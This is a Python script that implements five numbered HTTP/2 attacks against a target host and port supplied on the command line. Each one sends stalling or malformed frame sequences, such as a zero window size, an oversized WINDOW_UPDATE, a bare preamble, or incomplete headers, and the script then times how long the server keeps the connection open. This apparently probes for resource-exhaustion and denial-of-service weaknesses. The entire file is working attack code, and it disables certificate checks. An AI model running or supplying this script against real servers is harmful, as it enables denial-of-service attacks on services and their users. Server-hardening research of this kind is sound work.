#!/usr/bin/env python3

import socket, ssl, logging, time, sys, argparse
import h2.connection
from h2.config import H2Configuration
from hyperframe.frame import SettingsFrame, WindowUpdateFrame, HeadersFrame
from hpack.hpack_compat import Encoder

PREAMBLE = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
WINDOW_INCREMENT_SIZE = 1073676289 # value used by curl measured during tests

def get_http2_ssl_context():
    ctx = ssl.create_default_context(purpose=ssl.Purpose.SERVER_AUTH)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.options |= ssl.OP_NO_COMPRESSION
    ctx.options |= (
        ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3 | ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
    )
    ctx.set_alpn_protocols(["h2"])

    return ctx

def negotiate_tls(tcp_conn, context):
    tls_conn = context.wrap_socket(tcp_conn, server_hostname=args.target)
    negotiated_protocol = tls_conn.selected_alpn_protocol()
    if negotiated_protocol != "h2":
        raise RuntimeError("Didn't negotiate HTTP/2!")

    return tls_conn

def attack1(tls_conn, h2_conn):
    h2_conn._data_to_send += PREAMBLE
    h2_conn.update_settings({SettingsFrame.INITIAL_WINDOW_SIZE: 0})
    tls_conn.sendall(h2_conn.data_to_send())
    headers = [
        (':authority', args.target),
        (':path', '/'),
        (':scheme', 'https'),
        (':method', 'GET'),
    ]
    h2_conn.send_headers(1, headers, end_stream=True)
    tls_conn.sendall(h2_conn.data_to_send())

def attack2(tls_conn, h2_conn):
    h2_conn.initiate_connection()
    wf = WindowUpdateFrame(0)
    wf.window_increment = WINDOW_INCREMENT_SIZE
    h2_conn._data_to_send += wf.serialize()
    tls_conn.sendall(h2_conn.data_to_send())
    headers = [
        (':authority', args.target),
        (':path', '/'),
        (':scheme', 'https'),
        (':method', 'POST'),
    ]
    hf = HeadersFrame(1)
    hf.flags.add('END_HEADERS')
    e = Encoder()
    hf.data = hf.data = e.encode(headers)
    h2_conn._data_to_send += hf.serialize()
    tls_conn.sendall(h2_conn.data_to_send())

def attack3(tls_conn, h2_conn):
    h2_conn._data_to_send += PREAMBLE
    tls_conn.sendall(h2_conn.data_to_send())

def attack4(tls_conn, h2_conn):
    h2_conn.initiate_connection()
    wf = WindowUpdateFrame(0)
    wf.window_increment = WINDOW_INCREMENT_SIZE
    h2_conn._data_to_send += wf.serialize()
    tls_conn.sendall(h2_conn.data_to_send())
    headers = [
        (':authority', args.target),
        (':path', '/'),
        (':scheme', 'https'),
        (':method', 'GET'),
    ]
    hf = HeadersFrame(1)
    hf.flags.add('END_STREAM')
    e = Encoder()
    hf.data = hf.data = e.encode(headers)
    h2_conn._data_to_send += hf.serialize()
    tls_conn.sendall(h2_conn.data_to_send())

def attack5(tls_conn, h2_conn):
    h2_conn.initiate_connection()
    wf = WindowUpdateFrame(0)
    wf.window_increment = WINDOW_INCREMENT_SIZE
    h2_conn._data_to_send += wf.serialize()
    tls_conn.sendall(h2_conn.data_to_send())
    headers = [
        (':authority', args.target),
        (':path', '/'),
        (':scheme', 'https'),
        (':method', 'GET'),
    ]
    h2_conn.send_headers(1, headers, end_stream=True)
    tls_conn.sendall(h2_conn.data_to_send())

l = logging.Logger(name='test')
ol = logging.StreamHandler(sys.stdout)
ol.setLevel(logging.DEBUG)
l.addHandler(ol)

parser = argparse.ArgumentParser()
parser.add_argument("attackn", help="specify the attack number", type=int, choices=range(1, 6))
parser.add_argument("target", help="specify the hostname or IP of the target", type=str)
parser.add_argument("port", help="target port", type=int)
args = parser.parse_args()


attacks = [attack1, attack2, attack3, attack4, attack5]

# ./h2attack <attack nb> <target IP> <port>
def main():
    context = get_http2_ssl_context()

    conn = socket.create_connection((args.target, args.port))

    tls_conn = negotiate_tls(conn, context)

    config = H2Configuration(logger=l) #enable log
    h2_conn = h2.connection.H2Connection(config=config)

    attacks[args.attackn-1](tls_conn, h2_conn)

    # measure server timeout for closing the conn
    start = time.time()
    while True:
        data = tls_conn.recv(1024)
        if not data:
            break
    end = time.time()
    print("Server closed conn after {}s".format(end-start))

    input('Press a key to continue...')

main()

